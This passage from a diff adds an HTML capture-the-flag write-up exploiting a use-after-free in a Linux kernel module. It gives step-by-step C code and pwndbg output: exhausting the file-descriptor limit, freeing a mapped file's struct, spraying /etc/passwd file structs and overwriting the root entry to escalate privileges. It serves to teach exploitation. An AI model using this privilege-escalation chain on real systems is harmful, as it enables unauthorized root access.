+&lt;&#x2F;span&gt;&lt;span&gt;	new.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rlim_cur &lt;&#x2F;span&gt;&lt;span&gt;= cur;
+&lt;&#x2F;span&gt;&lt;span&gt;	new.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rlim_max &lt;&#x2F;span&gt;&lt;span&gt;= max;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; res = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;prlimit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getpid&lt;&#x2F;span&gt;&lt;span&gt;(), RLIMIT_NOFILE, &amp;amp;new, &amp;amp;old);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(res &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] prlimit failed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] RLIMIT_NOFILE set to:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rlim_cur = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rlim_max = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, cur, max);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;create-a-temporary-file&quot;&gt;Create a temporary file&lt;&#x2F;h3&gt;
+&lt;p&gt;Once we have created these helper functions, we can start with the actual exploit.
+Firstly, we need to open the LKM and a temporary file that will be the one used to trigger the UAF. This can be achieved the following way:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Opening LKM.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Opening LKM&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	device_fd = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(DEVICE_FILE, O_RDONLY);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(device_fd &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to open device file&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Opening tmp file.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Opening tmp file&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	fd0 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(TMP_FILE, O_CREAT | O_RDWR, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0666&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fd0 &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to open &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, TMP_FILE);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;map-the-temporary-file&quot;&gt;Map the temporary file&lt;&#x2F;h3&gt;
+&lt;p&gt;The next step is to map the previously opened temporary file into memory. This way we can get access to the file with a single pointer instead of going through a file descriptor. This mapping must allow read and write access and must have the &lt;code&gt;MAP_SHARED&lt;&#x2F;code&gt; flag set. This way any change in the mapped file will be carried through to the underlying file.&lt;&#x2F;p&gt;
+&lt;p&gt;We must take into account that if we want to access an empty mapped file, we will receive a &lt;code&gt;bus error&lt;&#x2F;code&gt; as we will be accessing beyond the file&#x27;s end. To avoid this later on, we can write a placeholder to the file.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Allocating some bytes into tmp file to prevent bus error.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; fallocate or ftruncate are other viable options.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Allocating some bytes into tmp file to prevent bus error&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(fd0, placeholder, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(placeholder));
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Mapping tmp file into memory.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Size 1 allocates minimum size which is an entire page.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Mapping tmp file into memory&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	ptr = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mmap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, PROT_READ | PROT_WRITE, MAP_SHARED, fd0, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(ptr == MAP_FAILED) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to map &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; into memory&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, TMP_FILE);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;drop-f-count-to-0&quot;&gt;Drop &lt;code&gt;f_count&lt;&#x2F;code&gt; to &lt;code&gt;0&lt;&#x2F;code&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;Now the &lt;code&gt;f_count&lt;&#x2F;code&gt; related to our temporary file should have a value of &lt;code&gt;2&lt;&#x2F;code&gt; as the mapping has increased the previous value by one.&lt;&#x2F;p&gt;
+&lt;p&gt;Our next goal is to force &lt;code&gt;get_unused_fd_flags(0)&lt;&#x2F;code&gt; to fail. As we explained before, this can be achieved by limiting the max amount of open files a process can have. We will use the previously defined wrapper for the &lt;code&gt;prlimit&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Limiting the max amount of file descriptors.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Limiting max amount of file descriptors&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;set_fd_limit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;);	
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Here we are setting the soft limit at &lt;code&gt;0&lt;&#x2F;code&gt; and the hard limit at &lt;code&gt;4096&lt;&#x2F;code&gt;. This way any attempt to open a new file descriptor will fail.&lt;&#x2F;p&gt;
+&lt;p&gt;As we said before, the actual value of &lt;code&gt;f_count&lt;&#x2F;code&gt; is &lt;code&gt;2&lt;&#x2F;code&gt; so this means we need to call &lt;code&gt;install_file&lt;&#x2F;code&gt; two consecutive times to drop this value to &lt;code&gt;0&lt;&#x2F;code&gt;. This will release the &lt;em&gt;file&lt;&#x2F;em&gt; struct and the memory region will be freed.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Forcing file struct release through file-&amp;gt;f_count-&amp;gt;counter decrement. 
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Forcing file struct release. Expecting EBADF:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	fd1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, &amp;amp;fd0);
+&lt;&#x2F;span&gt;&lt;span&gt;	fd1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, &amp;amp;fd0);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;At this point, we can check what happens with the &lt;code&gt;f_count&lt;&#x2F;code&gt;. To be able to put a breakpoint at the &lt;code&gt;install_file&lt;&#x2F;code&gt; function of the LKM, we will need to load the LKM symbols into gdb.&lt;&#x2F;p&gt;
+&lt;p&gt;To load the LKM symbols, we need to find the address of the &lt;code&gt;.text&lt;&#x2F;code&gt; section of the LKM inside the emulator:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;home&#x2F;user # cat &#x2F;sys&#x2F;module&#x2F;ctf&#x2F;sections&#x2F;.text
+&lt;&#x2F;span&gt;&lt;span&gt;0xffffffffc0203000
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Later, to load the symbols, we can do the following in gdb:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;pwndbg&amp;gt; target remote :1234
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; add-symbol-file initramfs&#x2F;chall&#x2F;ctf.ko 0xffffffffc0203000
+&lt;&#x2F;span&gt;&lt;span&gt;add symbol table from file &amp;quot;initramfs&#x2F;chall&#x2F;ctf.ko&amp;quot; at
+&lt;&#x2F;span&gt;&lt;span&gt;	.text_addr = 0xffffffffc0203000
+&lt;&#x2F;span&gt;&lt;span&gt;Reading symbols from initramfs&#x2F;chall&#x2F;ctf.ko...
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; b install_file
+&lt;&#x2F;span&gt;&lt;span&gt;Breakpoint 1 at 0xffffffffc0203070: file &#x2F;home&#x2F;bepernapat&#x2F;CTF&#x2F;EuskalHack&#x2F;initramfs&#x2F;chall&#x2F;ctf.c, line 14.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The first time we reach the breakpoint, if we execute the instructions one by one, we can see how &lt;code&gt;get_unused_fd_flags(0)&lt;&#x2F;code&gt; fails and we jump to the error management part. Here we can check how the &lt;code&gt;f_count&lt;&#x2F;code&gt; is decremented:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;─────[ SOURCE (CODE) ]───── 
+&lt;&#x2F;span&gt;&lt;span&gt;   52 error:
+&lt;&#x2F;span&gt;&lt;span&gt; ► 53         fput(file);
+&lt;&#x2F;span&gt;&lt;span&gt;   54         return -EBADF;
+&lt;&#x2F;span&gt;&lt;span&gt;   55 }
+&lt;&#x2F;span&gt;&lt;span&gt;───────────────────────────
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; p file-&amp;gt;f_count
+&lt;&#x2F;span&gt;&lt;span&gt;$1 = {
+&lt;&#x2F;span&gt;&lt;span&gt;  counter = 2
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; n
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;─────[ SOURCE (CODE) ]───── 
+&lt;&#x2F;span&gt;&lt;span&gt;   52 error:
+&lt;&#x2F;span&gt;&lt;span&gt;   53         fput(file);
+&lt;&#x2F;span&gt;&lt;span&gt; ► 54         return -EBADF;
+&lt;&#x2F;span&gt;&lt;span&gt;   55 }
+&lt;&#x2F;span&gt;&lt;span&gt;───────────────────────────
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; p file-&amp;gt;f_count
+&lt;&#x2F;span&gt;&lt;span&gt;$2 = {
+&lt;&#x2F;span&gt;&lt;span&gt;  counter = 1
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The following time we hit the breakpoint, we can see how the &lt;code&gt;f_count&lt;&#x2F;code&gt; drops to &lt;code&gt;0&lt;&#x2F;code&gt; and the &lt;em&gt;file&lt;&#x2F;em&gt; struct is released&#x2F;freed:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;─────[ SOURCE (CODE) ]───── 
+&lt;&#x2F;span&gt;&lt;span&gt;   52 error:
+&lt;&#x2F;span&gt;&lt;span&gt; ► 53         fput(file);
+&lt;&#x2F;span&gt;&lt;span&gt;   54         return -EBADF;
+&lt;&#x2F;span&gt;&lt;span&gt;   55 }
+&lt;&#x2F;span&gt;&lt;span&gt;───────────────────────────
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; p file-&amp;gt;f_count
+&lt;&#x2F;span&gt;&lt;span&gt;$3 = {
+&lt;&#x2F;span&gt;&lt;span&gt;  counter = 1
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; n
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;─────[ SOURCE (CODE) ]───── 
+&lt;&#x2F;span&gt;&lt;span&gt;   52 error:
+&lt;&#x2F;span&gt;&lt;span&gt;   53         fput(file);
+&lt;&#x2F;span&gt;&lt;span&gt; ► 54         return -EBADF;
+&lt;&#x2F;span&gt;&lt;span&gt;   55 }
+&lt;&#x2F;span&gt;&lt;span&gt;───────────────────────────
+&lt;&#x2F;span&gt;&lt;span&gt;pwndbg&amp;gt; p file-&amp;gt;f_count
+&lt;&#x2F;span&gt;&lt;span&gt;$4 = {
+&lt;&#x2F;span&gt;&lt;span&gt;  counter = 0
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;etc-passwd-spraying&quot;&gt;&lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; spraying&lt;&#x2F;h3&gt;
+&lt;p&gt;Now that the &lt;em&gt;file&lt;&#x2F;em&gt; struct has been released, we need to fill this freed space with a &lt;em&gt;file&lt;&#x2F;em&gt; struct pointing to a critical file. In this case, we spray with &lt;em&gt;file&lt;&#x2F;em&gt; structs pointing to &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Spray to fill the previously freed file struct with a &#x2F;etc&#x2F;passwd file struct. 
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Spraying file structs pointing to &#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; i &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;512&lt;&#x2F;span&gt;&lt;span&gt;; i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;		fd_spray[i] = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, O_RDONLY);
+&lt;&#x2F;span&gt;&lt;span&gt;       		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fd_spray[i] &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;                	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] Failed to spray &#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;        	}
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;By the time a &lt;em&gt;file&lt;&#x2F;em&gt; struct fills the previously freed space, we will be able to read and write &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; as these are the permissions we set when we first mapped the temporary file into memory.&lt;&#x2F;p&gt;
+&lt;p&gt;To check if the spraying has successfully finished, we can print the memory region we mapped at the beginning of the exploit. If the printed output is the content of &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt;, the spraying has successfully finished. Otherwise, we&#x27;ll see the content of the placeholder we set at the beginning.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Checking for successful UAF.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Checking for successful UAF. Content should be from &#x2F;etc&#x2F;passwd:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fputs&lt;&#x2F;span&gt;&lt;span&gt;(ptr, stdout);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;overwrite-etc-passwd&quot;&gt;Overwrite &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;After the last check is completed, we can overwrite the first line of &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; with our custom value:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Overwriting &#x2F;etc&#x2F;passwd root entry.
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Overwriting &#x2F;etc&#x2F;passwd root entry. Content should have been modified:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;memcpy&lt;&#x2F;span&gt;&lt;span&gt;(ptr, privesc, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(privesc));
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fputs&lt;&#x2F;span&gt;&lt;span&gt;(ptr, stdout);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;avoid-kernel-memory-problems&quot;&gt;Avoid kernel memory problems&lt;&#x2F;h3&gt;
